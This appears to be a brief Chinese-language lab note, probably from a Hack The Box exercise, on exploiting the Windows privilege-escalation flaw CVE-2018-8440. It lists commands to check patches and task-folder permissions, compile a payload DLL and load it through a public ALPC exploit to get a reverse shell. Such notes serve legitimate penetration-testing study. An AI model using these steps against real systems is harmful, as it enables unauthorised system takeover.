# 1、CVE-2018-8440分析提权（win2016、win10）

查看系统版本及补丁情况
```bash
systeminfo
```
查看目录权限
```bash
icacls C:\Windows\Tasks
```
user需要有读和执行的权限
参考ALPC DiagHub exploit - https://github.com/realoriginal/alpc-diaghub
下载对应版本的bin，编写dll
使用mingw-w64编译dll
```bash
apt install mingw-w64
x86_64-w64-mingw32-g++ payload.cpp -o payload.dll -lws2_32 -shared
```
执行命令加载dll获得反弹shell
```bash
cmd /c alpc.exe payload.dll .\htb.rtf
```
